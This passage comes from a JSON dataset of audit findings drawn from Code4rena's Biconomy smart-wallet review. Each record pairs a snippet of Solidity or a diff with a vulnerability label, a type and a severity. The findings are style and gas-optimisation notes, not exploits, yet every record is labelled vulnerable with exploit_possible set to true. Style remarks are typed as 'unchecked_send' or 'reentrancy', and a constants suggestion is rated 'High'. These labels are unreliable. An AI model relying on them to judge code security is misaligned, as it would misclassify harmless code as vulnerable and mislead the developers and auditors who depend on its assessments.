    "description": "Solidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct `polluted the source code` with an unnecessary object we were not using because we did not need it. This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Include return parameters in NatSpec comments _Recommendation  Code Style: (from Uniswap3)_ /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nthisFunctionCallIsReallyLong(\n    longArgument1,\n    longArgument2,\n    longArgument3\n);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Multiline output parameters and return statements should follow the same style recommended for wrapping long lines found in the Maximum Line Length section. https://docs.soliditylang.org/en/v0.8.17/style-guide.html#introduction thisFunctionCallIsReallyLong( longArgument1, longArgument2,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n /**\n  * @notice Sends ERC20 tokens trapped in contract to external address\n  * @dev Onlyowner is allowed to make this function call\n  * @param account is the receiving address\n  * @param externalToken is the token being sent\n  * @param amount is the quantity being sent\n  * @return boolean value indicating whether the operation succeeded.\n  *\n */\n  function rescueERC20(address account, address externalToken, uint256 amount) public onlyOwner returns (bool) {\n    IERC20(externalToken).transfer(account, amount);\n    return true;\n  }\n}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add this code: /** * @notice Sends ERC20 tokens trapped in contract to external address * @dev Onlyowner is allowed to make this function call * @param account is the receiving address",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.548,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n10 results - 7 files\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  11:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  25:      ISignatureValidatorConstants,\n  36:     string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n  42:     bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n  48:     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  11:     string public constant VERSION = \"1.0.2\";\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  28:     address private constant SIMULATE_FIND_AGGREGATOR = address(1);\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  12:     bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  16:     address internal constant SENTINEL_MODULES = address(0x1);\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  10:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "constants.sol",
    "description": "Use and import this file in contracts that require access to these values. This is just a suggestion, in some use cases this may result in higher gas usage in the distribution. 10 results - 7 files contracts/smart-contract-wallet/Proxy.sol: 11:     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26; contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n72 results - 22 files\n\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  17:          assembly {\n  24:         // solhint-disable-next-line no-inline-assembly\n  25:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  329:                 // solhint-disable-next-line no-inline-assembly\n  330:                 assembly {\n  337:                 // solhint-disable-next-line no-inline-assembly\n  338:                 assembly {\n  480:             assembly {\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  36:         // solhint-disable-next-line no-inline-assembly\n  37:         assembly {\n  55:         // solhint-disable-next-line no-inline-assembly\n  56:         assembly {\n\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol:\n  142:         // solhint-disable-next-line no-inline-assembly\n  143:         assembly {\n  324:                 // solhint-disable-next-line no-inline-assembly\n  325:                 assembly {\n  332:                 // solhint-disable-next-line no-inline-assembly\n  333:                 assembly {\n  470:             assembly {\n\ncontracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol:\n  5: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n    9: /* solhint-disable no-inline-assembly */\n  501:         assembly {offset := data}\n  505:         assembly {data := offset}\n  512:         assembly {mstore(0, number())}\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  19:         /* solhint-disable no-inline-assembly */\n  20:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  9: /* solhint-disable no-inline-assembly */\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n   4: /* solhint-disable no-inline-assembly */\n  39:         assembly {data := calldataload(userOp)}\n  63:         assembly {\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n   4: // solhint-disable no-inline-assembly\n  14:         assembly {\n  24:         assembly {\n  34:         assembly {\n  41:         assembly {\n  52:         assembly {\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  21:             // solhint-disable-next-line no-inline-assembly\n  22:             assembly {\n  26:             // solhint-disable-next-line no-inline-assembly\n  27:             assembly {\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  16:         // solhint-disable-next-line no-inline-assembly\n  17:         assembly {\n  34:         // solhint-disable-next-line no-inline-assembly\n  35:         assembly {\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n   87:         // solhint-disable-next-line no-inline-assembly\n   88:         assembly {\n  128:         // solhint-disable-next-line no-inline-assembly\n  129:         assembly {\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  18:         // solhint-disable-next-line no-inline-assembly\n  19:         assembly {\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  14:         // solhint-disable-next-line no-inline-assembly\n  15:         assembly {\n  21:         // solhint-disable-next-line no-inline-assembly\n  22:         assembly {\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  13:     // solhint-disable-next-line no-inline-assembly\n  14:     assembly { csize := extcodesize(account) }\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n   66:             assembly {\n   86:             assembly {\n  100:             assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  28:         // solhint-disable-next-line no-inline-assembly\n  29:         assembly {\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  22:         // solhint-disable-next-line no-inline-assembly\n  23:         assembly {\n\ncontracts/smart-contract-wallet/libs/Strings.sol:\n  23:             /// @solidity memory-safe-assembly\n  24:             assembly {\n  29:                 /// @solidity memory-safe-assembly\n  30:                 assembly {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-23] Assembly Codes Specific \u2013 Should Have Comments",
    "description": "Since this is a low level language that is more difficult to parse by readers, include extensive documentation, comments on the rationale behind its use, clearly explaining what each assembly instruction does. This will make it easier for users to trust the code, for reviewers to validate the code, and for developers to build on or update the code. Note that using Assembly removes several important security features of Solidity, which can make the code more insecure and more error-prone. 72 results - 22 files contracts/smart-contract-wallet/BaseSmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 120,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " to write *address storage values*  | 8 |\n| [G-22] |++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops| 6 |\n| [G-23] |Sort Solidity operations using short-circuit mode| 8 |\n| [G-24] |",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "Summary",
    "description": "| Number | Optimization Details | Context | |:--:|:-------| :-----:| | [G-01] | With assembly, `.call (bool success)` transfer can be done gas-optimized | 8 | | [G-02] |Remove the `initializer` modifier| 1 | | [G-03] |Structs can be packed into fewer storage slots |2 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.275,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");\n+            bool success;                                 \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-01] With assembly, `.call (bool success)` transfer can be done gas-optimized",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, but in a usage like below, 'out' and 'outsize' values are given (0,0), this storage disappears and gas optimization is provided. https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.589,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol:\n  19:     struct UserOperation {\n  20 \n  21         address sender;                // slot0   (20 bytes)\n- 22         uint256 nonce;                                      \n+ 22         uint96 nonce;                  // slot0   (12 bytes)\n- 23         bytes initCode;                                     \n- 24         bytes callData;                                     \n- 25         uint256 callGasLimit;                               \n- 26         uint256 verificationGasLimit;                       \n- 27         uint256 preVerificationGas;                         \n  28         uint128 maxFeePerGas;          // slot1   (16 bytes)\n  29         uint128 maxPriorityFeePerGas;  // slot1   (16 bytes)\n+ 25         uint256 callGasLimit;          // slot2   (32 bytes)\n+ 26         uint256 verificationGasLimit;  // slot3   (32 bytes)\n+ 27         uint256 preVerificationGas;    // slot4   (32 bytes)\n+ 23         bytes initCode;                // slot5   (32 bytes)\n+ 24         bytes callData;                // slot6   (32 bytes)\n  30         bytes paymasterAndData;        // slot7   (32 bytes)\n  31         bytes signature;               // slot8   (32 bytes)\n  32     } \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] Structs can be packed into fewer storage slots",
    "description": "The `UserOperation` struct can be packed into one slot less slot as suggested below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol: 19:     struct UserOperation { 20 21         address sender;                // slot0   (20 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol:\n  53:     struct DepositInfo {   \n+             StakeInfo stakeInfo;   \n  54          uint112 deposit;   \n  55          bool staked;   \n- 56          uint112 stakes;        \n- 57          uint32 unstakeDelaySec;\n  58          uint64 withdrawTime;   \n  59     }   \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-04] `DepositInfo` and `PaymasterData` structs can be rearranged",
    "description": "Gas saving can be achieved by updating the ``DepositInfo`` struct as below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol: 53:     struct DepositInfo { +             StakeInfo stakeInfo; 54          uint112 deposit;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.353,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n modifer check (address checkToAddress) {\n        require(checkToAddress != address(0) && checkToAddress != SENTINEL_MODULES, \"BSA101\");\n        _;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Recommendation",
    "description": "You can consider adding a modifier like below. modifer check (address checkToAddress) { require(checkToAddress != address(0) && checkToAddress != SENTINEL_MODULES, \"BSA101\"); _; }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.163,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\base\\Executor.sol:\n- event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n- event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n+ event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);\n\n  13     function execute(\n  31         // Emit events here..\n- 32:         if (success) emit ExecutionSuccess(to, value, data, operation, txGas);\n- 33:         else emit ExecutionFailure(to, value, data, operation, txGas);\n+             emit Execution (to, value, data, operation, txGas, success);\n  34     }\n  35     \n  36 }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-07] Instead of `emit ExecutionSuccess` and `emit ExecutionFailure` a single ` emit Execution` is gas efficient",
    "description": "If the `emit ExecutionSuccess` and `emit ExecutionFailure` at the end of the `execute` function are removed and arranged as follows, gas savings will be achieved. The last element of the `event Execution` bool success will indicate whether the operation was successful or unsuccessful, with a value of true or false. contracts\\smart-contract-wallet\\base\\Executor.sol: - event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); - event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); + event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.709,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:\n  41:         require(newAmount <= type(uint112).max, \"deposit overflow\");\n\n  65:         require(stake < type(uint112).max, \"stake overflow\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-13] Use constants instead of type(uintx).max",
    "description": "type(uint120).max or type(uint112).max, etc. it uses more gas in the distribution process and also for each transaction than constant usage. 3 results - 2 files: contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol: 397:       require(maxGasValues <= type(uint120).max, \"AA94 gas values overflow\"); [EntryPoint.sol#L397](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L397)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  56        uint256 currentBalance = paymasterIdBalances[msg.sender];\n  57        require(amount <= currentBalance, \"Insufficient amount to withdraw\");\n  58:       paymasterIdBalances[msg.sender] -= amount;\n ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-14] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require` or `if` statement",
    "description": "require(a <= b); x = b - a => require(a <= b); unchecked { x = b - a } if(a <= b); x = b - a => if(a <= b); unchecked { x = b - a } This will stop the check for overflow and underflow so it will save gas. 2 results - 2 files: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.313,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[StakeManager.sol#L42](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L42), [StakeManager.sol#L59](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L59), [StakeManager.sol#L69](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L69), [StakeManager.sol#L84](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L84), [StakeManager.sol#L118](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L118)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-15] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
    "description": "When using elements that are smaller than 32 bytes, your contracts gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed. 8 results - 3 files: contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[SmartAccount.sol#L109](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109), [SmartAccount.sol#L120](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L120), [SmartAccount.sol#L127](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L127), [SmartAccount.sol#L449](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449), [SmartAccount.sol#L455](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455), [SmartAccount.sol#L460](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460), [SmartAccount.sol#L465](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465), [SmartAccount.sol#L489](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489), [SmartAccount.sol#L536](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-19]  Functions guaranteed to revert_ when callled by normal users can be marked `payable`",
    "description": "If a function modifier or require such as onlyOwner-admin is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost. 18 results - 5 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 120:     function updateImplementation(address _implementation) external mixedAuth {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol:\n  100:    for (uint256 i = 0; i < opasLen; i++) {\n\n  107:    for (uint256 a = 0; a < opasLen; a++) {\n\n  112:    for (uint256 i = 0; i < opslen; i++) {\n\n  128:    for (uint256 a = 0; a < opasLen; a++) {\n\n  134:    for (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-22] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. 6 results - 2 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 468:    for (uint i = 0; i < dest.length;) { [SmartAccount.sol#L468](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L468)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.322,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[SmartAccount.sol#L83](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L83), [SmartAccount.sol#L232](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L232), [SmartAccount.sol#L495](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L495), [SmartAccount.sol#L511](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[G-23] Sort Solidity operations using short-circuit mode",
    "description": "Short-circuiting is a solidity contract development model that uses `OR/AND` logic to sequence different cost operations. It puts low gas cost operations in the front and high gas cost operations in the back, so that if the front is low If the cost operation is feasible, you can skip (short-circuit) the subsequent high-cost Ethereum virtual machine operation. //f(x) is a low gas cost operation //g(y) is a high gas cost operation //Sort operations with different gas costs as follows f(x) || g(y)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.603,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
